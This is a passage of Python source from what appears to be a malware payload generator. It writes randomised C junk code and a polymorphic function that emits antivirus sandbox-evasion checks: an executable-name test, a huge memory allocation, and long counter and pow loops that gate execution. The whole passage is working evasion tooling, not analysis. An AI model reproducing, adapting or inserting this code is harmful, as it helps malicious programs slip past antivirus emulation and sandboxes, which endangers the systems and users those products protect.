        Randcpt2= varname_creator()
        Randcpt3= varname_creator()
        Randcpt4= varname_creator()
        Randi = varname_creator()
        Junkcode = ""
        Junkcode += "int " + Randcpt + "  = " + Randbig1 + ";\n"
        Junkcode += "int " + Randcpt2 + " = " + Randbig2 + ";\n"
        Junkcode += "int " + Randcpt3 + "  = " + Randbig3 + ";\n"
        Junkcode += "int " + Randcpt4 + " = " + Randbig4 + ";\n"
        Junkcode += "while ( " + Randcpt + " > 0 ){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt2 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt + " = " + Randcpt + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt3 + "){\n"
        Junkcode += "if (" + Randcpt2 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt2 + " = " + Randcpt2 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}\n"
        Junkcode += "}else{\n"
        Junkcode += "if (" + Randcpt3 + " > " + Randcpt4 + "){\n"
        Junkcode += Randcpt3 + " = " + Randcpt3 + " - 1;}\n"
        Junkcode += "else{\n"
        Junkcode += Randcpt4 + " = " + Randcpt4 + " - 1;}}}\n"
        Junkcode += "printf(\"%d\"," + Randcpt + ");}\n"


    return Junkcode


def Polymorph_Multipath_Evasion(number,Filename):

    if number == "1": # What's my name

        Evasion_code = ""
        Evasion_code += "if (strstr(argv[0], \"" + Filename + ".exe\") > 0){\n"


    elif number == "2": # Giant memory allocation 

        Randmem = varname_creator()
        Randbig = str(random.randrange(30000000,100000000,1024))
        Evasion_code = ""
        Evasion_code += "char *" + Randmem + " = NULL;\n"
        Evasion_code += Randmem + " = (char *) malloc("+ Randbig + ");\n"
        Evasion_code += "if ("+ Randmem + "!=NULL){\n"
        Evasion_code += "memset(" + Randmem + ",00," + Randbig + ");\n"
        Evasion_code += "free(" + Randmem + ");\n"


    elif number == "3": # Loooooong Counter 

        Randbig = str(random.randrange(100000000,990000000,1000))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randcpt + "  = 0;\n"
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "for("+ Randi + " = 0;" + Randi + " < " + Randbig + "; " + Randi + "++){\n"
        Evasion_code += Randcpt + "++;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randbig + "){\n"


    elif number == "4": # am i zero?

        Randbig = str(random.randrange(100000000,990000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = 0;\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > 0 ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == 0){\n"

    elif number == "5": # powf counter 

        Randsmall = str(random.uniform(1.100,2.000))
        Randsmall2 = str(random.uniform(1.100,2.000))
        Randbig = str(random.randrange(10000,100000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "float " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "float " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = powf(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == "6": # pow counter 

        Randsmall = str(random.uniform(1.100,3.000))
        Randsmall2 = str(random.uniform(1.100,3.000))
        Randbig = str(random.randrange(10000,99000,100))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "double " + Randcpt + "  = " + Randsmall + ";\n"
        Evasion_code += "double " + Randi + " = " + Randsmall2 + ";\n"
        Evasion_code += "while(" + Randcpt + " < " + Randbig + "){\n"
        Evasion_code += Randcpt + " = pow(" + Randcpt + "," + Randi + ");}\n"
        Evasion_code += "if("+ Randcpt + " >= " + Randbig + "){\n"

    elif number == "7": # am i numb?

        Randbig = str(random.randrange(100000000,200000000,10))
        Randcpt= varname_creator()
        Randi = varname_creator()
        Evasion_code = ""
        Evasion_code += "int " + Randi + " = " + str(random.randrange(10,99,2)) + ";\n"
        Evasion_code += "int " + Randcpt + "  = " + Randbig + ";\n"
        Evasion_code += "while ( " + Randcpt + " > " + Randi + " ){\n"
        Evasion_code += Randcpt + " = " + Randcpt + " - 1;}\n"
        Evasion_code += "if("+ Randcpt + " == " + Randi + "){\n"

    return Evasion_code
          
def varname_creator():
    varname = ""
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
    return varname 



